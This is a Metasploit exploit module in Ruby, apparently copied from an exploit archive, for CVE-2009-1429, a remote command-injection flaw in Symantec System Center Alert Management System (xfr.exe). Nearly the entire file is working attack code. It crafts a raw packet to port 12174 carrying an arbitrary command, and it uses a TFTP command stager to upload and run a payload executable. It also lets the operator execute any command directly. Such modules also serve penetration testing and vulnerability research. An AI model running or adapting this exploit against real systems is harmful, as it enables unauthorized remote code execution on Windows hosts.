# $Id: ams_xfr.rb 13591 2011-08-19 18:35:29Z mc $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
 
    Rank = ExcellentRanking
 
    include Msf::Exploit::CmdStagerTFTP
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Symantec System Center Alert Management System (xfr.exe) Arbitrary Command Execution&#039;,
            &#039;Description&#039;    => %q{
                    Symantec System Center Alert Management System is prone to a remote command-injection vulnerability
                    because the application fails to properly sanitize user-supplied input.
            },
            &#039;Author&#039;         => [ &#039;MC&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13591 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2009-1429&#039; ],
                    [ &#039;BID&#039;, &#039;34671&#039; ],
                    [ &#039;OSVDB&#039;, &#039;54157&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-09-060/&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.symantec.com/business/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&suid=20090428_02&#039; ]
                ],
            &#039;Targets&#039;       =>
                [
                    [ &#039;Windows Universal&#039;,
                        {
                            &#039;Arch&#039; => ARCH_X86,
                            &#039;Platform&#039; => &#039;win&#039;
                        }
                    ]
                ],
            &#039;Privileged&#039; => &#039;true&#039;,
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Apr 28 2009&#039;))
 
        register_options(
            [
                Opt::RPORT(12174),
                OptString.new(&#039;CMD&#039;, [ false, &#039;Execute this command instead of using command stager&#039;, ""]),
            ], self.class)
    end
 
    def windows_stager
 
        exe_fname = rand_text_alphanumeric(4+rand(4)) + ".exe"
 
        print_status("Sending request to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}")
        execute_cmdstager({ :temp => &#039;.&#039;})
        @payload_exe = payload_exe
 
        print_status("Attempting to execute the payload...")
        execute_command(@payload_exe)
 
    end
 
    def execute_command(cmd, opts = {})
 
        connect
 
            len  = 2 + cmd.length
 
            data =  [0x00000000].pack(&#039;V&#039;)
            data << len.chr
            data << "\x00"
            data << cmd + " "
            data << "\x00"
 
            sock.put(data)
 
            res = sock.get_once
 
                if (!res)
                    print_error("Did not recieve data. Failed?")
                else
                    print_status("Got data, execution successful!")
                end
 
        disconnect
         
    end
 
    def exploit
 
        if not datastore[&#039;CMD&#039;].empty?
            print_status("Executing command &#039;#{datastore[&#039;CMD&#039;]}&#039;")
            execute_command(datastore[&#039;CMD&#039;])
            return
        end
 
        case target[&#039;Platform&#039;]
            when &#039;win&#039;
                windows_stager
            else
                raise RuntimeError, &#039;Target not supported.&#039;
            end
 
        handler
 
    end
end



